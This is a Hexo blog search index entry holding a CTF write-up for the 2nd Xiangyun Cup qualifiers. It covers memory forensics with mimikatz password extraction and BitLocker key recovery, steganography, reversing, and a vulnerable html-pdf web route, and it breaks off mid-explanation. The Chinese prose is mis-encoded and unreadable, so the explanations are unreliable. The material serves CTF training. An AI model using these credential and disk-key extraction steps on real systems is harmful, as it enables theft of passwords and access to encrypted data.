<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2nd ç¥¥äº‘æ¯ Quals</title>
      <link href="/zh-CN/posts/a282dc59.html"/>
      <url>/zh-CN/posts/a282dc59.html</url>
      
        <content type="html"><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="å±‚å±‚å–è¯"><a href="#å±‚å±‚å–è¯" class="headerlink" title="å±‚å±‚å–è¯"></a>å±‚å±‚å–è¯</h3><p>å°†é™„ä»¶è§£å‹åå¾—åˆ° E01 ç£ç›˜æ–‡ä»¶å’Œå†…å­˜é•œåƒï¼Œå¯¹å†…å­˜é•œåƒè¿›è¡Œ imageinfo æ£€æµ‹å¯å¾—å¦‚ä¸‹ç»“æœã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class="line">          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418</span><br><span class="line">                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)</span><br><span class="line">                     AS Layer2 : FileAddressSpace (&#x2F;mnt&#x2F;hgfs&#x2F;f&#x2F;ghrepos&#x2F;volatility2&#x2F;imgs&#x2F;memdump.mem)</span><br><span class="line">                      PAE type : No PAE</span><br><span class="line">                           DTB : 0x187000L</span><br><span class="line">                          KDBG : 0xf800040040a0L</span><br><span class="line">          Number of Processors : 2</span><br><span class="line">     Image Type (Service Pack) : 1</span><br><span class="line">                KPCR for CPU 0 : 0xfffff80004005d00L</span><br><span class="line">                KPCR for CPU 1 : 0xfffff88004700000L</span><br><span class="line">             KUSER_SHARED_DATA : 0xfffff78000000000L</span><br><span class="line">           Image date and time : 2020-08-15 11:40:37 UTC+0000</span><br><span class="line">     Image local date and time : 2020-08-15 19:40:37 +0800</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ Win7SP1x64 ä½œä¸º profile è¿›è¡Œ pslistï¼Œä»è€Œå¾—å‡ºé•œåƒæŠ“å–æ—¶çš„è¿›ç¨‹åˆ—è¡¨ã€‚å¯ä»¥å‘ç°æœ‰ FTK Imagerï¼Œä½¿ç”¨å…¶æŒ‚è½½é™„ä»¶ä¸­ç»™å‡ºçš„ç£ç›˜ï¼Œå¯ä»¥å‘ç°å¦‚ä¸‹æç¤ºã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint: ä½ è¿ç”µè„‘éƒ½ä¸èƒ½ä»¿çœŸæ‰“å¼€ï¼Œè¿˜æƒ³è¦flag ?</span><br></pre></td></tr></table></figure><h4 id="é•œåƒä»¿çœŸè™šæ‹Ÿæœº"><a href="#é•œåƒä»¿çœŸè™šæ‹Ÿæœº" class="headerlink" title="é•œåƒä»¿çœŸè™šæ‹Ÿæœº"></a>é•œåƒä»¿çœŸè™šæ‹Ÿæœº</h4><p>ä½¿ç”¨ FTK Imager æŒ‚è½½ä¸Šæ•´ä¸ª E01 ç£ç›˜ï¼Œç„¶åå¸è½½æ‰ç›˜ç¬¦ï¼Œè®°ä¸‹æ­¤æ—¶çš„ç´¢å¼•ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/20edba28-0183-47bf-b9a7-a7fef30e4caa/1629559257568922/0e21f3fd71546968853cd4fb06e95498acfa99bf.png"></p><p>æ­¤æ—¶å†æ‰“å¼€ VMware Workstation æ–°å»ºè™šæ‹Ÿæœºã€‚æŒ‰ç…§å‰é¢å¾—å‡ºçš„ imageinfo é€‰æ‹©ä¸ä¹‹å¯¹åº”çš„ Windows 7 x64ï¼Œç„¶åé€‰æ‹©ç‰©ç†ç£ç›˜ä½œä¸ºè™šæ‹Ÿæœºçš„ç£ç›˜ï¼Œç„¶åé€‰æ‹©å¯¹åº”çš„ç´¢å¼• PhysicalDrive2 æŒ‚è½½ã€‚æˆåŠŸä¹‹åå°†ä¼šåœ¨è®¾ç½®çš„ç›®å½•å¤„å¾—åˆ° vmdk æ ¼å¼çš„ç£ç›˜æ–‡ä»¶ã€‚æ­¤æ—¶ä½¿ç”¨ Oracle Virtual Box åŠ è½½å¯¹åº”çš„ vmdk å¹¶æ–°å»ºå¯¹åº”é…ç½®çš„è™šæ‹Ÿæœºã€‚å®Œæˆä¹‹åå³å¯ä½¿ç”¨ Oracle Virtual Box å¯åŠ¨è™šæ‹Ÿæœºã€‚</p><h4 id="mimikatz-å–è¯å‡ºç™»å½•å¯†ç "><a href="#mimikatz-å–è¯å‡ºç™»å½•å¯†ç " class="headerlink" title="mimikatz å–è¯å‡ºç™»å½•å¯†ç "></a>mimikatz å–è¯å‡ºç™»å½•å¯†ç </h4><p>å¯åŠ¨ç³»ç»Ÿåå¯ä»¥å‘ç°å…¶éœ€è¦ç™»å½•å¯†ç ï¼Œå› æ­¤å›åˆ°å†…å­˜å–è¯ä¸­å»ï¼Œä½¿ç”¨ mimikatz è¿›è¡Œç”¨æˆ·è´¦æˆ·å¯†ç æå–ï¼Œå¯ä»¥å¾—åˆ°å¦‚ä¸‹ç»“æœã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">Module   User             Domain           Password</span><br><span class="line">-------- ---------------- ---------------- ----------------------------------------</span><br><span class="line">wdigest  XiaoMing         PC               xiaoming_handsome</span><br><span class="line">wdigest  PC$              WORKGROUP</span><br></pre></td></tr></table></figure><p>å› æ­¤å¯ä»¥ä½¿ç”¨ xiaoming_handsome ç™»å½•è™šæ‹Ÿæœºä¸­çš„ç³»ç»Ÿã€‚ç™»å½•ç³»ç»Ÿåå¯ä»¥å‘ç°å…¶ä¸­æœ‰ä¾¿ç­¾ï¼Œå°†å¤§ç‰‡çš„ä¾¿ç­¾æŒªå¼€åå¯ä»¥å‘ç°æœ‰å°ç‰‡çš„ä¾¿ç­¾ï¼Œå…¶ä¸­åŒ…å«ç€ä¸€ä¸ªæ–‡æ¡£çš„å¯†ç ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/20edba28-0183-47bf-b9a7-a7fef30e4caa/1629559699202144/e1c7f88a6474ee9eb3f3b0530813140df486cf06.png"></p><p>æ‰“å¼€æ­¤ç”µè„‘åå¯ä»¥å‘ç°è¿˜æœ‰ä¸€ä¸ª Bitlocker åŠ å¯†çš„é©±åŠ¨å™¨ï¼Œä» FTK Imager ä¸­å¯ä»¥åˆ†ç¦»å‡ºå¯¹åº”çš„ dd raw æ–‡ä»¶ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/20edba28-0183-47bf-b9a7-a7fef30e4caa/1629559937081663/b42358b1f41ae99e27dd44596ece37bde38763fa.png"></p><p>å°† FTK Imager å¯¼å‡ºçš„é•œåƒæ–‡ä»¶è§£å‹ä¸€æ¬¡å¯å¾— dd æ–‡ä»¶ã€‚</p><h4 id="FVEK-å–è¯è§£å¯†é©±åŠ¨å™¨"><a href="#FVEK-å–è¯è§£å¯†é©±åŠ¨å™¨" class="headerlink" title="FVEK å–è¯è§£å¯†é©±åŠ¨å™¨"></a>FVEK å–è¯è§£å¯†é©±åŠ¨å™¨</h4><blockquote><p><a href="https://github.com/elceef/bitlocker">https://github.com/elceef/bitlocker</a></p></blockquote><p>å›åˆ°å†…å­˜å–è¯ï¼Œå¯¹å†…å­˜é•œåƒä½¿ç”¨ Volatility çš„ bitlocker æ’ä»¶åˆ†æå¯ä»¥å¾—åˆ°å¦‚ä¸‹ç»“æœã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line"></span><br><span class="line">Address : 0xfa800d12e7e0</span><br><span class="line">Cipher  : AES-128</span><br><span class="line">FVEK    : 0ff9192acdbf1df3c6dc36fb58cf76ce</span><br><span class="line">TWEAK   : b423bd84872ff72b583bb9bdee1762ac</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å¯ä»¥ä½¿ç”¨ bdemount é…åˆå¦‚ä¸‹æŒ‡ä»¤å¯¹é©±åŠ¨å™¨è¿›è¡Œè§£å¯†ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sudo</span> bdemount -k 0ff9192acdbf1df3c6dc36fb58cf76ce:b423bd84872ff72b583bb9bdee1762ac ext.dd /mnt/ctf</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶åœ¨ /mnt/ctf ä¸‹å¯ä»¥æ‰¾åˆ° bde1 æ–‡ä»¶ï¼Œå°†å…¶å¤åˆ¶åˆ° Windows ä¸‹ä¿®æ­£æ‹“å±•åä¸º vhdã€‚æ‰“å¼€ç£ç›˜å¯ä»¥å¾—åˆ° WireShark çš„æµé‡åŒ…æ–‡ä»¶ã€‚</p><h4 id="æµé‡åŒ…åˆ†æ"><a href="#æµé‡åŒ…åˆ†æ" class="headerlink" title="æµé‡åŒ…åˆ†æ"></a>æµé‡åŒ…åˆ†æ</h4><p>ä½¿ç”¨ WireShark å¯¹æµé‡åŒ…è¿›è¡Œåˆ†æï¼Œè·Ÿè¸ª UDP æµåˆ° 32 å¯ä»¥å¾—åˆ°ä¸€ä¸ªå‹ç¼©æ–‡æ¡£ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/20edba28-0183-47bf-b9a7-a7fef30e4caa/1629560400060461/5fd69660ae843812daf713693008aefd9584be52.png"></p><p>å°†å…¶æå–å‡ºæ¥ï¼Œå¯ä»¥åœ¨ä¿¡æ¯çš„éƒ¨åˆ†å‘ç°å¦‚ä¸‹æç¤ºã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/20edba28-0183-47bf-b9a7-a7fef30e4caa/1629560520934553/ef826fd2a811437d2f1ff55a12e1853d296dd497.png"></p><p>å› æ­¤ä½¿ç”¨ç”µè„‘çš„ç™»å½•å¯†ç é¡ºåˆ©è§£å‹å‹ç¼©æ–‡æ¡£ã€‚å†ä½¿ç”¨ç”µè„‘ä¾¿ç­¾ä¸­çš„å¯†ç è§£å¯† Word æ–‡æ¡£å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;9ca871b668f2-b668-097c-cbm8-9op404c891e2&#125;</span><br></pre></td></tr></table></figure><h3 id="é¸£é›æ‹"><a href="#é¸£é›æ‹" class="headerlink" title="é¸£é›æ‹"></a>é¸£é›æ‹</h3><p>é™„ä»¶ç»™å‡ºçš„å‹ç¼©åŒ…ä¸­æœ‰ä¸€ä¸ª Word æ–‡æ¡£ï¼Œåœ¨å…¶ _rels æ–‡ä»¶å¤¹ä¸‹å¯ä»¥å‘ç°ä¸¤ä¸ªæ–‡ä»¶ã€‚å°†å…¶è§£å‹å‡ºæ¥ï¼Œåœ¨ key.txt ä¸­å¯ä»¥å‘ç°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ä½©æ©â€Œâ€Œâ€Œâ€Œâ€â€Œâ€Œâ€¬â€Œâ€Œâ€Œâ€Œâ€â€¬â€â€:å‡­ä½ è¿™ç‚¹åŠ›é‡,â€Œâ€Œâ€Œâ€Œâ€â€¬â€Œï»¿â€Œâ€Œâ€Œâ€Œâ€â€¬â€Œâ€ä¸ºä»€ä¹ˆè¦æˆ˜æ–—â€Œâ€Œâ€Œâ€Œâ€ï»¿â€â€?</span><br><span class="line">â€Œâ€Œâ€Œâ€Œâ€ï»¿â€Œï»¿â€Œâ€Œâ€Œâ€Œâ€â€¬â€â€â€Œâ€Œâ€Œâ€Œâ€Œâ€¬â€Œâ€Œé›ç”°â€Œâ€Œâ€Œâ€Œâ€â€Œâ€¬â€â€Œâ€Œâ€Œâ€Œâ€Œâ€¬â€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€â€¬ï»¿â€Œ:è¯´åˆ°åšåˆ°â€Œâ€Œâ€Œâ€Œâ€â€¬â€¬â€â€Œâ€Œâ€Œâ€Œâ€â€¬â€¬ï»¿â€Œâ€Œâ€Œâ€Œâ€â€¬â€â€,â€Œâ€Œâ€Œâ€Œâ€Œâ€¬â€Œâ€Œå‹‡å¾€ç›´å‰â€Œâ€Œâ€Œâ€Œâ€â€¬ï»¿â€¬,â€Œâ€Œâ€Œâ€Œâ€â€¬â€Œâ€è¿™å°±æ˜¯æˆ‘çš„å¿é“.â€Œâ€Œâ€Œâ€Œâ€ï»¿â€Œâ€¬â€Œâ€Œâ€Œâ€Œâ€ï»¿â€â€â€Œâ€Œâ€Œâ€Œâ€ï»¿â€â€Œâ€Œâ€Œâ€Œâ€Œâ€â€¬ï»¿ï»¿â€Œâ€Œâ€Œâ€Œâ€Œâ€¬â€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€â€¬â€Œâ€¬â€Œâ€Œâ€Œâ€Œâ€â€¬â€â€â€Œâ€Œâ€Œâ€Œâ€ï»¿â€Œï»¿â€Œâ€Œâ€Œâ€Œâ€ï»¿â€â€Œ</span><br></pre></td></tr></table></figure><p>å¯¹è¿™ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨é›¶å®½å­—ç¬¦éšå†™è§£ç å¯ä»¥å¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Because I like naruto best</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨è¿™ä¸ªå­—ç¬¦ä¸²åšä¸ºå¯†ç è§£å‹ä¸Šè¿°å¾—åˆ°çš„å¦ä¸€ä¸ªæ–‡ä»¶ï¼Œå¯ä»¥å¾—åˆ°ä¸€å †å›¾ç‰‡ã€‚ä½¿ç”¨å¦‚ä¸‹è„šæœ¬å°†å…¶è½¬æ¢ä¸º 0/1 æ•°æ®ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">temp = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">129488</span>):</span><br><span class="line">    image = Image.<span class="built_in">open</span>(<span class="string">f&quot;G:\\out\\<span class="subst">&#123;i&#125;</span>.png&quot;</span>)</span><br><span class="line">    temp += <span class="built_in">str</span>(image.getpixel((<span class="number">0</span>,<span class="number">0</span>)))</span><br><span class="line">result_file = <span class="built_in">open</span>(<span class="string">&quot;./result.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">result_file.write(temp)</span><br><span class="line">result_file.flush()</span><br><span class="line">result_file.close()</span><br></pre></td></tr></table></figure><p>å°†å¾—åˆ°çš„æ•°æ®ä½¿ç”¨å¦‚ä¸‹ CyberChef Receipt å¤„ç†å¯ä»¥å¾—åˆ°ä¸€å¼ å›¾ç‰‡ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">From_Binary(&#39;Space&#39;,8)</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;data:image&#x2F;png;base64,&#39;&#125;,&#39;&#39;,true,false,true,false)</span><br><span class="line">Render_Image(&#39;Base64&#39;)</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/20edba28-0183-47bf-b9a7-a7fef30e4caa/1629648431415173/c34cb618537e14c97fccd8dfc9cda7bea3a17675.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;57dd74fb21bb1aee50f19421bf836f23&#125;</span><br></pre></td></tr></table></figure><h3 id="è€ƒå¤"><a href="#è€ƒå¤" class="headerlink" title="è€ƒå¤"></a>è€ƒå¤</h3><blockquote><p>å°æ˜åœ¨å®¶é‡Œç¿»åˆ°ä¸€å°å¾ˆå¤è€çš„xpç¬”è®°æœ¬ï¼Œæ¢ç”µæ± ä¹‹åå‘ç°å¯ä»¥æ­£å¸¸å¼€æœºï¼Œä½†æ˜¯å‘ç°ç¡¬ç›˜ç©ºé—´ä¸è¶³ã€‚æ¸…ç†è¿‡ç¨‹ä¸­å´å‘ç”Ÿäº†ä¸€äº›ä¸æ„‰å¿«çš„äº‹æƒ…â€¦</p></blockquote><p>å¯¹ç»™å‡ºçš„å†…å­˜é•œåƒä½¿ç”¨ Volatility åˆ†æï¼Œimageinfo å¯ä»¥å¾—åˆ°å¦‚ä¸‹ç»“æœã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class="line">          Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)</span><br><span class="line">                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)</span><br><span class="line">                     AS Layer2 : FileAddressSpace (&#x2F;mnt&#x2F;hgfs&#x2F;f&#x2F;ghrepos&#x2F;volatility2&#x2F;imgs&#x2F;memory)</span><br><span class="line">                      PAE type : PAE</span><br><span class="line">                           DTB : 0xa8f000L</span><br><span class="line">                          KDBG : 0x80545ce0L</span><br><span class="line">          Number of Processors : 1</span><br><span class="line">     Image Type (Service Pack) : 2</span><br><span class="line">                KPCR for CPU 0 : 0xffdff000L</span><br><span class="line">             KUSER_SHARED_DATA : 0xffdf0000L</span><br><span class="line">           Image date and time : 2021-08-06 16:43:57 UTC+0000</span><br><span class="line">     Image local date and time : 2021-08-07 00:43:57 +0800</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>filescan | grep &quot;æ¡Œé¢&quot;</code> å¯ä»¥å‘ç°å…¶æ¡Œé¢æœ‰å¦‚ä¸‹å¯ç–‘æ–‡ä»¶ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0000000001956d88      1      0 R--r-d \Device\HarddiskVolume1\Documents and Settings\Administrator\æ¡Œé¢\Oneclickcleanup.exe</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ dumpfiles å°†æ–‡ä»¶æå–å‡ºæ¥ã€‚</p><h4 id="Usherâ€™s-Reverse-Part"><a href="#Usherâ€™s-Reverse-Part" class="headerlink" title="Usherâ€™s Reverse Part"></a>Usherâ€™s Reverse Part</h4><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/20edba28-0183-47bf-b9a7-a7fef30e4caa/1629649347231569/35876a9a44d17814ad26df92965a717f3761a1b1.png"></p><p>åœ¨è¿™ä¸€è¡Œä¸‹æ–­ç‚¹ï¼Œè¿è¡Œåˆ°æ–­ä¸‹æ¥ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/20edba28-0183-47bf-b9a7-a7fef30e4caa/1629649404001988/b79783be589ec2ea4d499b91557bc68bb2e851c0.png"></p><p>æ­¤æ—¶ä¿®æ”¹æ‰€æ‰“å¼€çš„æ–‡ä»¶åï¼Œä¿å­˜å F9 è·‘å®Œå°±å¯ä»¥å¾—åˆ°å¦ä¸€ä¸ªæ–‡ä»¶ã€‚å°†æ‰€å¾—çš„æ–‡ä»¶æŒ‰ä½å¼‚æˆ– 0x2D å³å¯åœ¨æ–‡ä»¶ä¸­æ‰¾åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8bedfdbb-ba42-43d1-858c-c2a5-5012d309&#125;</span><br></pre></td></tr></table></figure><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Secrets-Of-Admin"><a href="#Secrets-Of-Admin" class="headerlink" title="Secrets_Of_Admin"></a>Secrets_Of_Admin</h3><blockquote><p>Reveal the secret of admin for me.</p></blockquote><p>åœ¨é¢˜ç›®ç»™å‡ºçš„æºç ä¸­å¯ä»¥å‘ç°ç”¨æˆ· admin åŠå…¶ç™»å½•å¯†ç  e365655e013ce7fdbdbf8f27b418c8fe6dc9354dc4c0328fa02b0ea547659645ã€‚åŒæ—¶è¿˜èƒ½å‘ç° flag åŠå…¶ checksum be5a14a8e504a66979f6938338b0662cã€‚</p><p>åœ¨ index.ts ä¸‹å¯ä»¥å‘ç°ä½¿ç”¨ 127.0.0.1 è¯·æ±‚å¯ä»¥æ·»åŠ æ–‡ä»¶è®°å½•çš„è·¯ç”±ã€‚</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// You can also add file logs here!</span></span><br><span class="line">router.get(<span class="string">&#x27;/api/files&#x27;</span>, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.socket.remoteAddress.replace(<span class="regexp">/^.*:/</span>, <span class="string">&#x27;&#x27;</span>) != <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> next(createError(<span class="number">401</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> &#123; username , filename, checksum &#125; = req.query;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span>(username) == <span class="string">&quot;string&quot;</span> &amp;&amp; <span class="keyword">typeof</span>(filename) == <span class="string">&quot;string&quot;</span> &amp;&amp; <span class="keyword">typeof</span>(checksum) == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">await</span> DB.Create(username, filename, checksum)</span><br><span class="line">            <span class="keyword">return</span> res.send(<span class="string">&#x27;Done&#x27;</span>)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.send(<span class="string">&#x27;Error!&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(<span class="string">&#x27;Parameters error&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>å› æ­¤éœ€è¦æƒ³åŠæ³•è¿›è¡Œ XSS æˆ–è€… SSRFï¼Œå¢åŠ ä¸€æ¡æ–‡ä»¶è®°å½•ï¼Œè®© flag çš„æ–‡ä»¶ä¹ŸåŒæ—¶å±äº adminï¼Œæ­¤æ—¶æ‰èƒ½ç”¨å…¶ checksum è¯»å–åˆ°ã€‚æ­£å¥½è¿™é‡Œæœ‰ä¸€ä¸ªä½¿ç”¨ html-pdf è¿›è¡Œ HTML è½¬ PDF çš„è·¯ç”±ï¼Œå› æ­¤å¯ä»¥å°è¯•ä½¿ç”¨è¿™ä¸ªè·¯ç”±è¿›è¡Œ XSSã€‚</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/admin&#x27;</span>, checkAuth, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; content &#125; = req.body;</span><br><span class="line">    <span class="keyword">if</span> ( content == <span class="string">&#x27;&#x27;</span> || content.includes(<span class="string">&#x27;&lt;&#x27;</span>) || content.includes(<span class="string">&#x27;&gt;&#x27;</span>) || content.includes(<span class="string">&#x27;/&#x27;</span>) || content.includes(<span class="string">&#x27;script&#x27;</span>) || content.includes(<span class="string">&#x27;on&#x27;</span>))&#123;</span><br><span class="line">        <span class="comment">// even admin can&#x27;t be trusted right ? :)  </span></span><br><span class="line">        <span class="keyword">return</span> res.render(<span class="string">&#x27;admin&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Forbidden word ğŸ¤¬&#x27;</span>&#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> template = <span class="string">`</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;meta charset=&quot;utf8&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;Create your own pdfs&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;<span class="subst">$&#123;content&#125;</span>&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        `</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> filename = <span class="string">`<span class="subst">$&#123;uuid()&#125;</span>.pdf`</span></span><br><span class="line">            pdf.create(template, &#123;</span><br><span class="line">                <span class="string">&quot;format&quot;</span>: <span class="string">&quot;Letter&quot;</span>,</span><br><span class="line">                <span class="string">&quot;orientation&quot;</span>: <span class="string">&quot;portrait&quot;</span>,</span><br><span class="line">                <span class="string">&quot;border&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;pdf&quot;</span>,</span><br><span class="line">                <span class="string">&quot;renderDelay&quot;</span>: <span class="number">3000</span>,</span><br><span class="line">                <span class="string">&quot;timeout&quot;</span>: <span class="number">5000</span></span><br><span class="line">            &#125;).toFile(<span class="string">`./files/<span class="subst">$&#123;filename&#125;</span>`</span>, <span class="keyword">async</span> (err, _) =&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) next(createError(<span class="number">500</span>));</span><br><span class="line">                <span class="keyword">const</span> checksum = <span class="keyword">await</span> getCheckSum(filename);</span><br><span class="line">                <span class="keyword">await</span> DB.Create(<span class="string">&#x27;superuser&#x27;</span>, filename, checksum)</span><br><span class="line">                <span class="keyword">return</span> res.render(<span class="string">&#x27;admin&#x27;</span>, &#123; <span class="attr">message</span> : <span class="string">`Your pdf is successfully saved ğŸ¤‘ You know how to download it right?`</span>&#125;);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.render(<span class="string">&#x27;admin&#x27;</span>, &#123; <span class="attr">error</span> : <span class="string">&#x27;Failed to generate pdf ğŸ˜¥&#x27;</span>&#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°è¿™é‡Œå¯¹æäº¤çš„ content ä½¿ç”¨ include 